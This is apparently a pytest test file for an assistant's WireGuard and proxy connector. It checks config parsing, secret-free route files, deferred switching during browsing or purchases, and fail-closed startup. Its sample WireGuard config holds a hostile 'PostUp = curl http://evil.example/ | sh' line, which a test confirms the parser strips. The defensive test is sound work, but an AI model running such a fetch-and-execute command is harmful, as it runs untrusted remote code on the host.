"""The VPN / Proxy connectors (vpn.py): the pasted WireGuard file and proxy address, the files the other containers read (and never
contain), switching only when the browser is quiet, the safe state at a locked start, and Kelo's web reads through the route."""

import asyncio
import base64
import json
import logging
import os
import stat

import pytest
from vpn_fakes import FakeSocks5

from assistant.keyconnect import KeyConnections, KeyError_
from assistant.keyguard import Locked
from assistant.store import Store
from assistant.vpn import PROXY_ITEM, WG_ITEM, VpnError, VpnRoute, parse_proxy, parse_wireguard

PRIV = base64.b64encode(b"p" * 32).decode()
PUB = base64.b64encode(b"q" * 32).decode()
PSK = base64.b64encode(b"s" * 32).decode()
CONF = f"""[Interface]
# Device: laptop
PrivateKey = {PRIV}
Address = 10.66.12.34/32, fc00:bbbb:bbbb:bb01::3:b22/128
DNS = 10.64.0.1, example.net
PostUp = curl http://evil.example/ | sh

[Peer]
PublicKey = {PUB}
PresharedKey = {PSK}
AllowedIPs = 0.0.0.0/0, ::0/0
Endpoint = 193.32.127.66:51820
"""


def public_resolver(host, port, *a, **k):
    return [(2, 1, 6, "", ("93.184.216.34", port))]


def make(tmp_path, **kw):
    route, vpn_dir = tmp_path / "route", tmp_path / "vpn"
    route.mkdir(exist_ok=True)
    vpn_dir.mkdir(exist_ok=True)
    store = kw.pop("store", None) or Store()
    kw.setdefault("resolver", public_resolver)

    async def up():
        return True

    kw.setdefault("probe", up)
    v = VpnRoute(store, route, vpn_dir, **kw)
    return v, store, route, vpn_dir


def route_json(route):
    return json.loads((route / "route.json").read_text())


# ----------------------------------------------------------------------------------------------------------------------- parsing
def test_a_wireguard_file_is_read_and_only_the_known_fields_are_kept():
    cfg = parse_wireguard(CONF)
    assert cfg.addresses == ("10.66.12.34/32", "fc00:bbbb:bbbb:bb01:0:3:b22/128") or len(cfg.addresses) == 2
    assert cfg.dns == ("10.64.0.1",) and cfg.endpoint == "193.32.127.66:51820" and cfg.preshared_key == PSK
    out = cfg.render()
    assert f"PrivateKey = {PRIV}" in out and "[Socks5]\nBindAddress = 0.0.0.0:1080" in out
    assert "PostUp" not in out and "evil" not in out and "example.net" not in out      # nothing else of the pasted text is carried over


@pytest.mark.parametrize("flatten", [lambda s: s.replace("\n", " "), lambda s: s.replace("\n", "\r\n"), lambda s: s.replace(" = ", "=").replace("\n", " "),
                                     lambda s: "   " + s.replace("\n", "   \n   ")])
def test_newlines_may_have_turned_into_spaces(flatten):
    cfg = parse_wireguard(flatten(CONF))
    assert cfg.private_key == PRIV and cfg.public_key == PUB and cfg.endpoint == "193.32.127.66:51820"
    assert cfg.addresses[0] == "10.66.12.34/32" and cfg.dns == ("10.64.0.1",)


def test_defaults_ipv6_endpoint_and_a_missing_dns():
    minimal = f"[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = {PUB}\nEndpoint = [2a03:1b20:1::1]:51820\n"
    cfg = parse_wireguard(minimal)
    assert cfg.allowed_ips == ("0.0.0.0/0", "::/0") and cfg.dns == ("1.1.1.1",) and cfg.endpoint == "[2a03:1b20:1::1]:51820" and not cfg.preshared_key
    assert parse_wireguard(minimal.replace("[2a03:1b20:1::1]", "vpn.example.com")).endpoint == "vpn.example.com:51820"


@pytest.mark.parametrize("text,word", [
    ("", "WireGuard"), ("hello world", "WireGuard"),
    (CONF.replace("PrivateKey", "Private"), "PrivateKey"),
    (CONF.replace("Address = 10.66.12.34/32, fc00:bbbb:bbbb:bb01::3:b22/128", ""), "Address"),
    (CONF.replace("PublicKey", "Public"), "PublicKey"),
    (CONF.replace("Endpoint = 193.32.127.66:51820", ""), "Endpoint"),
    (CONF.replace(PRIV, "tooshort="), "PrivateKey"),
    (CONF.replace(PRIV, "!" * 44), "PrivateKey"),
    (CONF.replace(PUB, base64.b64encode(b"x" * 33).decode()[:44]), "PublicKey"),
    (CONF.replace(PSK, "nope"), "PresharedKey"),
    (CONF.replace("193.32.127.66:51820", "193.32.127.66"), "Endpoint"),
    (CONF.replace("193.32.127.66:51820", "193.32.127.66:99999"), "Endpoint"),
    (CONF.replace("193.32.127.66:51820", "192.168.1.1:51820"), "private"),
    (CONF.replace("193.32.127.66:51820", "127.0.0.1:51820"), "private"),
    (CONF.replace("193.32.127.66:51820", "nas.local:51820"), "Endpoint"),
    (CONF.replace("10.66.12.34/32", "10.66.12.34/99"), "Address"),
])
def test_a_file_with_missing_or_bad_fields_is_refused_with_a_clear_message(text, word):
    with pytest.raises(VpnError) as e:
        parse_wireguard(text)
    assert word in str(e.value)


async def test_proxy_addresses(tmp_path):
    p = await parse_proxy("socks5://45.83.220.9:1080", "me", "pw", resolver=public_resolver)
    assert (p.kind, p.host, p.port, p.user, p.password) == ("socks5", "45.83.220.9", 1080, "me", "pw")
    p = await parse_proxy("socks5h://user:p%40ss@proxy.example.com", resolver=public_resolver)
    assert (p.kind, p.port, p.user, p.password) == ("socks5", 1080, "user", "p@ss")
    p = await parse_proxy("HTTP://proxy.example.com", resolver=public_resolver)
    assert (p.kind, p.port, p.user) == ("http", 8080, "")
    assert (await parse_proxy("https://proxy.example.com:8443", resolver=public_resolver)).kind == "https"
    for bad in ("", "proxy.example.com:1080", "ftp://proxy.example.com", "socks5://proxy.example.com:1080/path", "socks5://", "socks5://host:99999",
                "socks5://a b.example.com", "socks5://127.0.0.1:1080", "socks5://192.168.1.1:1080", "socks5://[::1]:1080"):
        with pytest.raises(VpnError):
            await parse_proxy(bad, resolver=public_resolver)
    with pytest.raises(VpnError):                     # a name that resolves to the home network
        await parse_proxy("socks5://nas.example.com:1080", resolver=lambda h, p, *a, **k: [(2, 1, 6, "", ("192.168.1.9", p))])


# ----------------------------------------------------------------------------------------------------------------------- files
async def test_wireguard_connect_writes_private_files_and_a_route_without_secrets(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    got = await v.connect_wireguard(CONF)
    assert got["state"] == "applied" and got["account"] == "193.32.127.66:51820"
    wg = vpn_dir / "wg.conf"
    assert stat.S_IMODE(wg.stat().st_mode) == 0o600 and f"PrivateKey = {PRIV}" in wg.read_text()
    assert not (vpn_dir / "upstream.json").exists()
    body = (route / "route.json").read_text()
    assert route_json(route) == {"mode": "socks5", "host": "vpn", "port": 1080, "generation": 1}
    assert PRIV not in body and PSK not in body and "10.66" not in body and "193.32" not in body       # egress's file has no keys
    cred = store.credential(WG_ITEM)
    assert cred["secret"].strip() == CONF.strip() and cred["kind"] == "api"                            # the raw file is in the vault
    assert v.proxy_url() == "socks5h://vpn:1080" and v.kind == "wireguard"
    assert not any(f.name.startswith(".") for f in vpn_dir.iterdir())                                  # no temp file left behind


async def test_proxy_connect_puts_the_password_only_in_the_sidecars_file(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    got = await v.connect_proxy("socks5://45.83.220.9:1080", "me", "hunter2 with space")
    assert got["state"] == "applied"
    up = vpn_dir / "upstream.json"
    assert stat.S_IMODE(up.stat().st_mode) == 0o600
    assert json.loads(up.read_text()) == {"kind": "socks5", "host": "45.83.220.9", "port": 1080, "user": "me", "password": "hunter2 with space"}
    assert not (vpn_dir / "wg.conf").exists()
    body = (route / "route.json").read_text()
    assert "hunter2" not in body and "me" not in json.loads(body).get("user", "") and route_json(route)["mode"] == "socks5"
    assert json.loads(store.credential(PROXY_ITEM)["secret"])["password"] == "hunter2 with space"


async def test_at_most_one_is_active_and_every_change_raises_the_generation(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    assert route_json(route)["generation"] == 1
    await v.connect_proxy("socks5://45.83.220.9:1080")
    assert (vpn_dir / "upstream.json").exists() and not (vpn_dir / "wg.conf").exists()
    assert store.credential(WG_ITEM) is None and store.credential(PROXY_ITEM) is not None and v.kind == "proxy"
    assert route_json(route)["generation"] == 2
    await v.connect_wireguard(CONF)
    assert not (vpn_dir / "upstream.json").exists() and (vpn_dir / "wg.conf").exists() and store.credential(PROXY_ITEM) is None
    assert route_json(route)["generation"] == 3
    await v.connect_wireguard(CONF)                                   # the same thing again: nothing changes, no new generation
    assert route_json(route)["generation"] == 3
    assert v.state()["generation"] == 3


async def test_disconnect_returns_to_direct_and_removes_everything(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    got = await v.disconnect()
    assert got["state"] == "applied"
    assert route_json(route)["mode"] == "direct" and route_json(route)["generation"] == 2
    assert list(vpn_dir.iterdir()) == [] and store.credential(WG_ITEM) is None and v.proxy_url() is None and v.kind == "direct"
    assert not v.active() and (await v.status())["mode"] == "direct"


async def test_a_bad_file_changes_nothing(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    with pytest.raises(VpnError):
        await v.connect_wireguard(CONF.replace(PRIV, "bad"))
    with pytest.raises(VpnError):
        await v.connect_proxy("socks5://127.0.0.1:1080")
    assert route_json(route)["generation"] == 1 and (vpn_dir / "wg.conf").exists() and store.credential(WG_ITEM) is not None


async def test_without_the_vpn_container_nothing_is_offered(tmp_path):
    store = Store()
    v = VpnRoute(store, tmp_path / "nope", tmp_path / "nope2")
    assert not v.available
    with pytest.raises(VpnError):
        await v.connect_wireguard(CONF)
    assert await v.reconcile() is None and v.proxy_url() is None


# ------------------------------------------------------------------------------------------------- not in the middle of browsing
async def test_a_change_waits_until_the_browser_is_quiet_then_is_made(tmp_path):
    state = {"busy": True}
    v, store, route, vpn_dir = make(tmp_path, browsing=lambda: state["busy"], wait_poll=0.01)
    got = await v.connect_wireguard(CONF)
    assert got["state"] == "queued" and "browsing finishes" in got["message"]
    assert not (vpn_dir / "wg.conf").exists() and not (route / "route.json").exists() and v.kind == "direct"     # nothing changed yet
    assert v.pending is not None and v.proxy_url() is None
    await asyncio.sleep(0.05)
    assert v.pending is not None                                       # still busy: still waiting
    state["busy"] = False
    await asyncio.wait_for(v.settle(), 3)
    assert v.pending is None and route_json(route)["mode"] == "socks5" and (vpn_dir / "wg.conf").exists() and v.kind == "wireguard"
    assert any(r["action"] == "route" for r in store.vault_log())      # written to the log


async def test_force_makes_the_change_at_once_even_while_browsing(tmp_path):
    v, store, route, vpn_dir = make(tmp_path, browsing=lambda: True, wait_poll=0.01)
    queued = await v.connect_wireguard(CONF)
    assert queued["state"] == "queued"
    got = await v.reconcile(force=True)                                # the owner asks again, with force
    assert got["state"] == "applied" and route_json(route)["mode"] == "socks5" and v.pending is None
    await v.disconnect(force=True)
    assert route_json(route)["mode"] == "direct"
    again = await v.connect_proxy("socks5://45.83.220.9:1080", force=True)
    assert again["state"] == "applied"


async def test_an_open_purchase_is_never_interrupted_not_even_with_force(tmp_path):
    state = {"paying": True, "busy": True}
    v, store, route, vpn_dir = make(tmp_path, paying=lambda: state["paying"], browsing=lambda: state["busy"], wait_poll=0.01)
    got = await v.connect_wireguard(CONF, force=True)
    assert got["state"] == "queued" and "purchase" in got["message"]
    assert not (vpn_dir / "wg.conf").exists()
    await asyncio.sleep(0.05)
    assert v.pending is not None and not (vpn_dir / "wg.conf").exists()
    assert (await v.reconcile(force=True))["state"] == "queued"
    state["paying"] = False
    assert v.pending is not None                                       # the purchase is over, but the browser is still in use
    state["busy"] = False
    await asyncio.wait_for(v.settle(), 3)
    assert route_json(route)["mode"] == "socks5" and v.pending is None


async def test_a_change_that_waited_half_an_hour_is_made_anyway_unless_a_purchase_is_open(tmp_path):
    now = [1000.0]
    state = {"paying": False}
    v, store, route, vpn_dir = make(tmp_path, browsing=lambda: True, paying=lambda: state["paying"], clock=lambda: now[0], wait_poll=0.01)
    assert (await v.connect_wireguard(CONF))["state"] == "queued"
    await asyncio.sleep(0.05)
    assert v.pending is not None
    state["paying"] = True
    now[0] += 31 * 60
    await asyncio.sleep(0.05)
    assert v.pending is not None                                       # 30 minutes are over, but a purchase is open: still waiting
    state["paying"] = False
    await asyncio.wait_for(v.settle(), 3)
    assert route_json(route)["mode"] == "socks5"


async def test_asking_for_what_is_already_in_effect_drops_a_waiting_change(tmp_path):
    state = {"busy": False}
    v, store, route, vpn_dir = make(tmp_path, browsing=lambda: state["busy"], wait_poll=0.01)
    await v.connect_wireguard(CONF)
    state["busy"] = True
    await v.connect_proxy("socks5://45.83.220.9:1080")                 # waits
    assert v.pending is not None and v.pending.kind == "proxy"
    await v.connect_wireguard(CONF)                                    # the owner changed their mind: the current route again
    assert v.pending is None and v.kind == "wireguard"


# ------------------------------------------------------------------------------------------ start-up, Keyguard, following the vault
async def test_the_files_are_rebuilt_from_the_vault_at_start(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    for f in list(route.iterdir()) + list(vpn_dir.iterdir()):         # the volumes were lost
        f.unlink()
    v2, _, _, _ = make(tmp_path, store=store)
    class Unlocked:
        locked = False
    await v2.start(Unlocked())
    assert (vpn_dir / "wg.conf").exists() and f"PrivateKey = {PRIV}" in (vpn_dir / "wg.conf").read_text()
    assert route_json(route)["mode"] == "socks5"
    # and a vault that now holds a proxy instead
    await v2.connect_proxy("socks5://45.83.220.9:1080", "u", "p")
    for f in list(route.iterdir()) + list(vpn_dir.iterdir()):
        f.unlink()
    v3, _, _, _ = make(tmp_path, store=store)
    await v3.start(Unlocked())
    assert json.loads((vpn_dir / "upstream.json").read_text())["password"] == "p" and not (vpn_dir / "wg.conf").exists()


async def test_a_start_behind_keyguard_is_safe_browsing_is_refused_until_the_unlock(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    for f in list(route.iterdir()) + list(vpn_dir.iterdir()):
        f.unlink()                                                     # the files are gone and the vault cannot be read
    real = store.credential

    def locked(name):
        if name == WG_ITEM:
            raise Locked("locked")
        return real(name)

    store.credential = locked
    waiting = []

    class Guard:
        locked = True

        def after_unlock(self, fn):
            waiting.append(fn)

    v2, _, _, _ = make(tmp_path, store=store)
    await v2.start(Guard())
    assert route_json(route)["mode"] == "socks5"                       # egress says "through the VPN" ...
    assert not (vpn_dir / "wg.conf").exists()                          # ... and there is nothing behind it: fail closed, not direct
    assert len(waiting) == 1
    store.credential = real                                            # the phone unlocked
    await waiting[0]()
    assert (vpn_dir / "wg.conf").exists() and route_json(route)["mode"] == "socks5"
    assert route_json(route)["generation"] >= 2                        # the safe state was a change of its own


async def test_a_damaged_vault_item_keeps_browsing_refused(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    store.set_credential_secret(WG_ITEM, "this is not a wireguard file")
    await asyncio.sleep(0.05)                                          # the watcher ran
    assert route_json(route)["mode"] == "socks5" and v.kind == "wireguard"   # unchanged, never direct


async def test_deleting_the_item_in_the_vault_returns_to_direct(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    store.delete_credential(WG_ITEM)
    for _ in range(50):
        if route_json(route)["mode"] == "direct":
            break
        await asyncio.sleep(0.02)
    assert route_json(route)["mode"] == "direct" and not (vpn_dir / "wg.conf").exists()


async def test_the_key_connector_card_saves_and_reports_what_happens(tmp_path):
    v, store, route, vpn_dir = make(tmp_path)
    keys = KeyConnections(store, vpn=v)
    out = await keys.connect("vpn_wireguard", {"config": CONF})
    assert out["item"] == WG_ITEM and out["vpn"]["state"] == "applied" and out["vpn"]["connected"] is True and out["account"] == "193.32.127.66:51820"
    assert "Sites" in out["vpn"]["message"] or out["vpn"]["message"]
    with pytest.raises(KeyError_) as e:
        await keys.connect("vpn_wireguard", {"config": "nope"})
    assert "WireGuard" in str(e.value)
    out = await keys.connect("vpn_proxy", {"address": "socks5://45.83.220.9:1080", "user": "", "password": ""}, force=True)
    assert out["item"] == PROXY_ITEM and v.kind == "proxy"
    bare = KeyConnections(store)
    with pytest.raises(KeyError_):
        await bare.connect("vpn_wireguard", {"config": CONF})


# ----------------------------------------------------------------------------------------------------------------------- status
async def test_status_probes_through_the_sidecar_and_caches_the_exit_address(tmp_path):
    calls = {"probe": 0, "exit": 0}
    ok = {"up": True}

    async def probe():
        calls["probe"] += 1
        return ok["up"]

    async def lookup():
        calls["exit"] += 1
        return "203.0.113.77\n"

    now = [1000.0]
    v, store, route, vpn_dir = make(tmp_path, probe=probe, exit_lookup=lookup, clock=lambda: now[0])
    assert (await v.status()) == {"mode": "direct", "connected": False} and calls["probe"] == 0
    await v.connect_wireguard(CONF)
    s = await v.status()
    assert s == {"mode": "wireguard", "connected": True, "exit_ip": "203.0.113.77"} and v.account() == "exit 203.0.113.77"
    await v.status()
    assert calls == {"probe": 1, "exit": 1}                            # cached
    now[0] += 31
    await v.status()
    assert calls == {"probe": 2, "exit": 1}                            # the probe is repeated, the exit address is not
    now[0] += 601
    await v.status(fresh=True)
    assert calls["exit"] == 2
    ok["up"] = False
    s = await v.status(fresh=True)
    assert s["connected"] is False and "exit_ip" not in s and v.account() == ""
    assert "not connected" in await v.down_note()
    ok["up"] = True
    assert await v.down_note() == ""


async def test_the_real_probe_is_a_socks5_connect_to_1_1_1_1(tmp_path, monkeypatch):
    fake = await FakeSocks5().start()
    from assistant import vpn as vpn_mod
    monkeypatch.setattr(vpn_mod, "SIDECAR_HOST", "127.0.0.1")
    monkeypatch.setattr(vpn_mod, "SIDECAR_PORT", fake.port)
    store = Store()
    (tmp_path / "r").mkdir()
    (tmp_path / "v").mkdir()
    v = VpnRoute(store, tmp_path / "r", tmp_path / "v")
    try:
        assert await v._default_probe() is True
        assert [(q["atyp"], q["host"], q["port"]) for q in fake.requests] == [(1, "1.1.1.1", 443)]
        await fake.close()
        assert await v._default_probe() is False
    finally:
        await fake.close()


# ------------------------------------------------------------------------------------------------------------------ no secret in logs
async def test_no_secret_is_logged(tmp_path, caplog):
    caplog.set_level(logging.DEBUG)
    v, store, route, vpn_dir = make(tmp_path)
    await v.connect_wireguard(CONF)
    await v.connect_proxy("socks5://45.83.220.9:1080", "theuser", "thepassword")
    try:
        await v.connect_wireguard(CONF.replace(PRIV, "bad" + PRIV))
    except VpnError:
        pass
    store.set_credential_secret(PROXY_ITEM, "garbage")
    await asyncio.sleep(0.05)
    await v.disconnect()
    logged = caplog.text + json.dumps(store.vault_log(500)) + json.dumps([r for r in store.credentials()])
    for secret in (PRIV, PSK, "thepassword", "hunter2", "theuser"):
        assert secret not in logged
